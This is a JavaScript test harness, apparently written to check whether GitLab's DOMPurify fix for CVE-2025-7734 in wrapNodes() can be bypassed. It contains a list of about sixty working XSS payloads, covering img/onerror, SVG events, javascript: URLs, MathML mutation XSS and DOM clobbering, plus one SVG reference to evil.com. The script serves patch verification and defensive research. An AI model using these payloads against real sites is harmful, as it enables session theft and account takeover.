/**
 * CVE-2025-7734 Bypass Test ‚Äî Fixed wrapNodes() with DOMPurify
 *
 * This script reproduces the FIXED wrapNodes() function from GitLab commit 8370acfa
 * and tests a comprehensive set of XSS payloads against it to identify potential bypasses.
 *
 * The fix adds DOMPurify sanitize() after wrapSpacesWithSpans() and before innerHTML assignment.
 * We test whether any payload can survive the sanitize() call and still execute JavaScript.
 */

const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

// Initialize jsdom with a full browser-like environment
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
  url: 'http://gitlab.local',
  runScripts: 'dangerously',
  pretendToBeVisual: true,
});
const window = dom.window;
const document = window.document;

// Initialize DOMPurify with jsdom's window
const DOMPurify = createDOMPurify(window);

// ============================================================
// Reproduce GitLab's DOMPurify configuration from lib/dompurify.js
// ============================================================
const defaultConfig = {
  ADD_TAGS: ['use', 'gl-emoji', 'copy-code'],
  FORBID_ATTR: [
    'data-remote',
    'data-url',
    'data-type',
    'data-method',
    'data-disable-with',
    'data-disabled',
    'data-disable',
    'data-turbo',
  ],
  FORBID_TAGS: ['style', 'mstyle', 'form'],
  ALLOW_UNKNOWN_PROTOCOLS: true,
};

// Register GitLab's custom hooks
const TEMPORARY_ATTRIBUTE = 'data-temp-href-target';

DOMPurify.addHook('beforeSanitizeAttributes', (node) => {
  if (node.tagName === 'A' && node.hasAttribute('target')) {
    node.setAttribute(TEMPORARY_ATTRIBUTE, node.getAttribute('target'));
  }
});

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A' && node.hasAttribute(TEMPORARY_ATTRIBUTE)) {
    node.setAttribute('target', node.getAttribute(TEMPORARY_ATTRIBUTE));
    node.removeAttribute(TEMPORARY_ATTRIBUTE);
    if (node.getAttribute('target') === '_blank') {
      const rel = node.getAttribute('rel');
      const attrs = new Set(rel ? rel.toLowerCase().split(' ') : []);
      attrs.add('noopener');
      attrs.add('noreferrer');
      node.setAttribute('rel', Array.from(attrs).join(' '));
    }
  }
  // SVG use tag hook
  if (node.tagName && node.tagName.toLowerCase() === 'use') {
    // In the real app, this validates href against allowed icon URLs
    // For testing, we'll strip all hrefs on <use> (since no gon.sprite_* is configured)
    if (node.hasAttribute('href')) {
      const href = node.getAttribute('href');
      if (!href.match(/^#/)) {
        node.removeAttribute('href');
      }
    }
    if (node.hasAttribute('xlink:href')) {
      const href = node.getAttribute('xlink:href');
      if (!href.match(/^#/)) {
        node.removeAttribute('xlink:href');
      }
    }
  }
});

function sanitize(val, config) {
  return DOMPurify.sanitize(val, { ...defaultConfig, ...config });
}

// ============================================================
// Reproduce GitLab's FIXED wrapNodes() function
// ============================================================
const createSpan = (content, classList) => {
  const span = document.createElement('span');
  span.innerText = content;
  span.classList = classList || '';
  return span;
};

const wrapSpacesWithSpans = (text) =>
  text.replace(/ /g, createSpan(' ').outerHTML).replace(/\t/g, createSpan('	').outerHTML);

const wrapNodes_FIXED = (text) => {
  const wrapper = createSpan();
  const unSafeHtml = wrapSpacesWithSpans(text);
  wrapper.innerHTML = sanitize(unSafeHtml);
  return { wrapper, sanitizedHtml: wrapper.innerHTML, inputHtml: unSafeHtml };
};

const wrapNodes_VULNERABLE = (text) => {
  const wrapper = createSpan();
  wrapper.innerHTML = wrapSpacesWithSpans(text);
  return { wrapper, rawHtml: wrapper.innerHTML };
};

// ============================================================
// XSS Detection
// ============================================================
function detectXSS(element) {
  const issues = [];

  // Check for dangerous elements
  const dangerousTags = ['script', 'iframe', 'object', 'embed', 'applet'];
  for (const tag of dangerousTags) {
    const els = element.querySelectorAll(tag);
    if (els.length > 0) {
      issues.push(`Found <${tag}> element(s): ${els.length}`);
    }
  }

  // Check for elements with event handlers
  const allElements = element.querySelectorAll('*');
  for (const el of allElements) {
    for (const attr of el.attributes) {
      if (attr.name.startsWith('on')) {
        issues.push(`Event handler on <${el.tagName.toLowerCase()}>: ${attr.name}="${attr.value}"`);
      }
    }
  }

  // Check for javascript: URLs
  const linksAndSrc = element.querySelectorAll('[href], [src], [action], [formaction], [xlink\\:href]');
  for (const el of linksAndSrc) {
    for (const attr of ['href', 'src', 'action', 'formaction']) {
      const val = el.getAttribute(attr);
      if (val && /^(javascript|data|vbscript):/i.test(val.trim())) {
        issues.push(`Dangerous URI on <${el.tagName.toLowerCase()}> ${attr}="${val}"`);
      }
    }
  }

  // Check for SVG elements with dangerous attributes
  const svgs = element.querySelectorAll('svg, svg *');
  for (const el of svgs) {
    for (const attr of el.attributes) {
      if (attr.name.startsWith('on') || attr.name === 'href') {
        if (/^(javascript|data):/i.test((attr.value || '').trim())) {
          issues.push(`SVG dangerous attr: ${attr.name}="${attr.value}"`);
        }
      }
    }
  }

  // Check for <img> elements (potential onerror)
  const imgs = element.querySelectorAll('img');
  for (const img of imgs) {
    let hasHandler = false;
    for (const attr of img.attributes) {
      if (attr.name.startsWith('on')) {
        hasHandler = true;
        issues.push(`<img> with ${attr.name}="${attr.value}"`);
      }
    }
  }

  return issues;
}

// ============================================================
// Test Payloads
// ============================================================
const payloads = [
  // === Category 1: Original exploit payloads ===
  { name: 'Original img/onerror', text: '<img/src/onerror=alert(document.domain)>' },
  { name: 'Original img with space', text: '<img src=x onerror=alert(1)>' },
  { name: 'SVG onload', text: '<svg/onload=alert(1)>' },
  { name: 'Script tag', text: '<script>alert(1)</script>' },

  // === Category 2: Encoding bypasses ===
  { name: 'HTML entity encoded', text: '&#60;img src=x onerror=alert(1)&#62;' },
  { name: 'Hex entity encoded', text: '&#x3C;img src=x onerror=alert(1)&#x3E;' },
  { name: 'Mixed case IMG', text: '<IMG SRC=x ONERROR=alert(1)>' },
  { name: 'Mixed case iMg', text: '<iMg sRc=x oNeRrOr=alert(1)>' },
  { name: 'Null byte in tag', text: '<im\x00g src=x onerror=alert(1)>' },
  { name: 'Tab in tag name', text: '<img\tsrc=x\tonerror=alert(1)>' },
  { name: 'Newline in tag', text: '<img\nsrc=x\nonerror=alert(1)>' },
  { name: 'Form feed in tag', text: '<img\fsrc=x\fonerror=alert(1)>' },

  // === Category 3: Alternative XSS vectors ===
  { name: 'Body onload', text: '<body onload=alert(1)>' },
  { name: 'Details/ontoggle', text: '<details open ontoggle=alert(1)>' },
  { name: 'Input onfocus', text: '<input onfocus=alert(1) autofocus>' },
  { name: 'Marquee onstart', text: '<marquee onstart=alert(1)>' },
  { name: 'Video onerror', text: '<video><source onerror=alert(1)>' },
  { name: 'Audio onerror', text: '<audio src=x onerror=alert(1)>' },

  // === Category 4: URL-based XSS ===
  { name: 'Anchor javascript:', text: '<a href="javascript:alert(1)">click</a>' },
  { name: 'Anchor JavaScript: mixed', text: '<a href="JavaScript:alert(1)">click</a>' },
  { name: 'Anchor data: text/html', text: '<a href="data:text/html,<script>alert(1)</script>">click</a>' },
  { name: 'Anchor vbscript:', text: '<a href="vbscript:MsgBox(1)">click</a>' },
  { name: 'Iframe src javascript:', text: '<iframe src="javascript:alert(1)"></iframe>' },
  { name: 'Object data javascript:', text: '<object data="javascript:alert(1)"></object>' },

  // === Category 5: SVG-based attacks ===
  { name: 'SVG script', text: '<svg><script>alert(1)</script></svg>' },
  { name: 'SVG animate onbegin', text: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>' },
  { name: 'SVG set onbegin', text: '<svg><set onbegin=alert(1) attributeName=x to=1>' },
  { name: 'SVG foreignObject', text: '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload=alert(1)></foreignObject></svg>' },
  { name: 'SVG use external', text: '<svg><use href="http://evil.com/xss.svg#payload"></use></svg>' },
  { name: 'SVG use local', text: '<svg><use href="#xss-payload"></use></svg>' },

  // === Category 6: MathML-based mXSS ===
  { name: 'MathML mtext table mXSS', text: '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>' },
  { name: 'MathML without style', text: '<math><mtext><img src=x onerror=alert(1)></mtext></math>' },
  { name: 'MathML annotation-xml', text: '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>' },

  // === Category 7: Namespace confusion ===
  { name: 'SVG in HTML', text: '<svg><desc><img src=x onerror=alert(1)></desc></svg>' },
  { name: 'SVG title img', text: '<svg><title><img src=x onerror=alert(1)></title></svg>' },
  { name: 'Nested namespace', text: '<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>' },

  // === Category 8: DOM clobbering ===
  { name: 'DOM clob form', text: '<form id="x"><input name="innerHTML" value="<img onerror=alert(1) src>"></form>' },
  { name: 'DOM clob anchor', text: '<a id="sanitize" href="javascript:alert(1)">x</a>' },

  // === Category 9: wrapSpacesWithSpans interaction ===
  { name: 'Payload with leading spaces', text: '   <img src=x onerror=alert(1)>   ' },
  { name: 'Space-split tag name', text: '< img src=x onerror=alert(1)>' },
  { name: 'Double space in attr', text: '<img  src=x  onerror=alert(1)>' },
  { name: 'Tab-separated attrs', text: '<img\tsrc=x\tonerror=alert(1)>' },
  { name: 'Space before >', text: '<img src=x onerror=alert(1) >' },
  { name: 'Closing span injection', text: '</span><img src=x onerror=alert(1)><span>' },
  { name: 'Break out with quotes', text: '"><img src=x onerror=alert(1)>"' },
  { name: 'Encoded space in handler', text: '<img src=x onerror=alert&#40;1&#41;>' },

  // === Category 10: Template/noscript tricks ===
  { name: 'Template tag', text: '<template><img src=x onerror=alert(1)></template>' },
  { name: 'Noscript XSS', text: '<noscript><img src=x onerror=alert(1)></noscript>' },
  { name: 'Textarea break', text: '<textarea></textarea><img src=x onerror=alert(1)>' },

  // === Category 11: Custom elements (GitLab ADD_TAGS) ===
  { name: 'gl-emoji with handler', text: '<gl-emoji onload=alert(1) data-name="thumbsup">üëç</gl-emoji>' },
  { name: 'copy-code with handler', text: '<copy-code onclick=alert(1)>code</copy-code>' },
  { name: 'use with javascript href', text: '<svg><use href="javascript:alert(1)"></use></svg>' },

  // === Category 12: Edge cases ===
  { name: 'Empty handler', text: '<img src=x onerror="">' },
  { name: 'Backtick in handler', text: '<img src=x onerror=`alert(1)`>' },
  { name: 'Unicode handler', text: '<img src=x \u006Fnerror=alert(1)>' },
  { name: 'Very long payload', text: '<img src=x onerror=' + 'a'.repeat(1000) + 'lert(1)>' },
  { name: 'Null byte before handler', text: '<img src=x \x00onerror=alert(1)>' },
  { name: 'CRLF injection', text: '<img src=x\r\nonerror=alert(1)>' },
];

// ============================================================
// Run Tests
// ============================================================
console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
console.log('CVE-2025-7734 BYPASS TEST ‚Äî Fixed wrapNodes() with DOMPurify 3.2.6');
console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
console.log(`DOMPurify version: ${DOMPurify.version}`);
console.log(`Config: ${JSON.stringify(defaultConfig, null, 2)}`);
console.log('');

let totalTests = 0;
let bypasses = 0;
let vulnerableButFixed = 0;
const results = [];

for (const { name, text } of payloads) {
  totalTests++;

  // Test FIXED version
  const fixed = wrapNodes_FIXED(text);
  const fixedIssues = detectXSS(fixed.wrapper);

  // Test VULNERABLE version (for comparison)
  const vuln = wrapNodes_VULNERABLE(text);
  const vulnIssues = detectXSS(vuln.wrapper);

  const isVulnerable = vulnIssues.length > 0;
  const isBypassed = fixedIssues.length > 0;

  if (isVulnerable) vulnerableButFixed++;

  const status = isBypassed ? 'üö® BYPASS!' : (isVulnerable ? '‚úÖ Fixed' : '‚¨ú N/A');

  results.push({
    name,
    status,
    isBypassed,
    isVulnerable,
    fixedIssues,
    vulnIssues,
    sanitizedHtml: fixed.sanitizedHtml,
    inputHtml: fixed.inputHtml,
  });

  if (isBypassed) {
    bypasses++;
    console.log(`üö® BYPASS FOUND: ${name}`);
    console.log(`   Input text:    ${text}`);
    console.log(`   After wrapSpaces: ${fixed.inputHtml.substring(0, 200)}`);
    console.log(`   After sanitize:   ${fixed.sanitizedHtml.substring(0, 200)}`);
    console.log(`   Issues: ${fixedIssues.join('; ')}`);
    console.log('');
  }
}

// ============================================================
// Summary
// ============================================================
console.log('');
console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
console.log('RESULTS SUMMARY');
console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
console.log(`Total payloads tested:  ${totalTests}`);
console.log(`Vulnerable (unpatched): ${vulnerableButFixed}`);
console.log(`Bypass found (patched): ${bypasses}`);
console.log('');

if (bypasses > 0) {
  console.log('üö® BYPASSES DETECTED! The fix may be incomplete.');
  for (const r of results.filter(r => r.isBypassed)) {
    console.log(`  - ${r.name}: ${r.fixedIssues.join('; ')}`);
  }
} else {
  console.log('‚úÖ No bypasses found. DOMPurify sanitization appears effective.');
}

console.log('');
console.log('‚îÄ‚îÄ Detailed Results ‚îÄ‚îÄ');
for (const r of results) {
  const fixedStr = r.isBypassed ? `BYPASS: ${r.fixedIssues.join('; ')}` : 'sanitized';
  const vulnStr = r.isVulnerable ? `XSS: ${r.vulnIssues.join('; ')}` : 'no XSS';
  console.log(`${r.status} ${r.name}`);
  console.log(`     Vuln: ${vulnStr}`);
  console.log(`     Fix:  ${fixedStr}`);
  console.log(`     HTML: ${r.sanitizedHtml.substring(0, 120)}`);
}
